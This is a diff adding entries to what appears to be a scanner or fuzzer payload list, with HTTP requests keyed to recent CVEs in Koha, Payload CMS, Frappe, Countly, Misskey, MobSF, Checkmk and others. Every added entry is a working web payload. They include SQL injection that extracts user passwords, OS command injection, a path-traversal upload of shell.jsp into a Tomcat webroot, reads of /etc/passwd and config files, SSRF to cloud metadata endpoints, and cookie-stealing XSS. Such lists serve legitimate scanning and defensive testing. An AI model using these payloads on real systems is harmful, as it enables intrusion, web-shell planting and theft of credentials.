@@ -4282,3 +4282,78 @@ GET /user?name=%27+or+contains(%2F%2Fuser%5B1%5D%2Fname%2C%27a%27)
 GET /user?name=%27+or+name()+%3D+%27configuration%27
 POST /api/items header="Content-Type: application/json" body="{\"id\":\"1' or '1'='1\"}"
 POST /login header="Content-Type: application/x-www-form-urlencoded" body="username=x' or 1=1 or ''='&password=x"
+
+# --- CVE-2026-105107 (Koha): authenticated SQL injection in the
+#     most-circulated items report through Criteria, Filter, and Limit. ---
+GET /cgi-bin/koha/reports/cat_issues_top.pl?Criteria=1%20union%20select%20user(),password%20from%20borrowers&Filter=1&Limit=10
+GET /cgi-bin/koha/reports/cat_issues_top.pl?Criteria=1&Filter=x%27%20or%20%271%27=%271&Limit=10
+GET /cgi-bin/koha/reports/cat_issues_top.pl?Criteria=1&Filter=1&Limit=1%20union%20select%20user()
+
+# --- CVE-2026-105106 (Koha): OS command injection in the task scheduler
+#     delete path (tools/scheduler.pl jobid). ---
+POST /cgi-bin/koha/tools/scheduler.pl header="Content-Type: application/x-www-form-urlencoded" body="op=cud-delete&jobid=1;id"
+POST /cgi-bin/koha/tools/scheduler.pl header="Content-Type: application/x-www-form-urlencoded" body="op=cud-delete&jobid=$(id)"
+
+# --- CVE-2026-110116 (Risesoft Digital-Infrastructure): unauthenticated
+#     path traversal and file write through /rest/storeFile. ---
+POST /rest/storeFile header="Content-Type: application/x-www-form-urlencoded" body="fullPath=../../../../opt/tomcat/webapps/ROOT&fileName=shell.jsp"
+POST /rest/storeFile header="Content-Type: application/x-www-form-urlencoded" body="fullPath=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT&fileName=shell.jsp"
+
+# --- CVE-2026-110115 (Risesoft Digital-Infrastructure): unauthenticated file
+#     read through /rest/retrieveFileStream. ---
+GET /rest/retrieveFileStream?fullPath=../../../../opt/app/config&fileName=application.yml
+GET /rest/retrieveFileStream?fullPath=..%2f..%2f..%2f..%2fopt%2fapp%2fconfig&fileName=application.yml
+
+# --- CVE-2026-63316 (Payload CMS): SQL injection in the in and not_in query
+#     operators. ---
+GET /api/posts?where%5Bid%5D%5Bin%5D=1%20union%20select%20user()
+GET /api/posts?where%5Bid%5D%5Bnot_in%5D=1)%20or%20(1=1
+
+# --- CVE-2026-55823 (Frappe): SQL injection in reportview get_count. ---
+POST /api/method/frappe.desk.reportview.get_count header="Content-Type: application/json" body="{\"doctype\":\"User\",\"filters\":[[\"name\",\"like\",\"1%' union select password from `tabUser`--\"]]}"
+POST /api/method/frappe.desk.reportview.get_count header="Content-Type: application/json" body="{\"doctype\":\"User\",\"filters\":{\"name\":\"1' or '1'='1\"}}"
+
+# --- CVE-2026-63165 (Omnispace Agora): ORDER BY SQL injection through the
+#     sortEvents parameter. ---
+GET /calendar?sortEvents=1%20union%20select%20user()
+GET /calendar?sortEvents=(select%20sleep(5))
+
+# --- CVE-2026-93484 (Znuny): SQL injection in the ContentSearch operator. ---
+POST /otrs/index.pl header="Content-Type: application/x-www-form-urlencoded" body="Action=AgentTicketSearch&Subaction=Search&ContentSearch=AND%20(SELECT%20sleep(5))"
+
+# --- CVE-2026-41582 (Countly): unauthenticated path traversal in the public
+#     image and screenshot routes. ---
+GET /appimages/../../../../../../etc/passwd
+GET /star-rating/images/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+GET /dashboards/images/screenshots/../../../../../../etc/passwd
+
+# --- CVE-2026-104817 (Misskey): unauthenticated fetch-rss SSRF and internal
+#     network probing. ---
+POST /api/fetch-rss header="Content-Type: application/json" body="{\"url\":\"http://127.0.0.1:9200/_cluster/health\"}"
+POST /api/fetch-rss header="Content-Type: application/json" body="{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"
+
+# --- CVE-2026-59970 (Tandoor Recipes): AI provider URL SSRF bypassing the
+#     outbound-request checks. ---
+POST /api/ai-import/ header="Content-Type: application/json" body="{\"url\":\"http://169.254.169.254/latest/meta-data/iam/\"}"
+POST /api/ai-step-sort/ header="Content-Type: application/json" body="{\"provider_url\":\"http://127.0.0.1:8080/internal\"}"
+
+# --- CVE-2026-104585 (MobSF): command injection in the Dynamic Analyzer
+#     download endpoint and scan API. ---
+GET /download_data/?file=test.apk;id
+GET /download_data/?file=$(id).apk
+POST /api/v1/scan header="Content-Type: application/x-www-form-urlencoded" body="scan_type=apk&file_name=a.apk;id"
+
+# --- CVE-2026-14452 (Checkmk): reset_url script and redirect injection. ---
+GET /check_mk/index.py?reset_url=javascript:alert(document.cookie)
+GET /check_mk/index.py?reset_url=https://evil.example/
+
+# --- CVE-2026-109960 (Froxlor): stored XSS through the customer theme. ---
+POST /customer_index.php header="Content-Type: application/x-www-form-urlencoded" body="theme=<script>alert(document.cookie)</script>"
+POST /customer_index.php header="Content-Type: application/x-www-form-urlencoded" body="theme=<img src=x onerror=alert(1)>"
+
+# --- CVE-2026-104252 (Vitess): reflected XSS in the /twopcz debug endpoint. ---
+POST /twopcz header="Content-Type: application/x-www-form-urlencoded" body="Action=<script>alert(1)</script>&dtid=1"
+GET /twopcz?Action=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+# --- CVE-2026-102982 (Plane): stored unsafe URL scheme in comment_html. ---
+POST /api/v1/workspaces/acme/projects/1/issues/1/comments/ header="Content-Type: application/json" body="{\"comment_html\":\"<a href=\\\"javascript:alert(1)\\\">click</a>\"}"
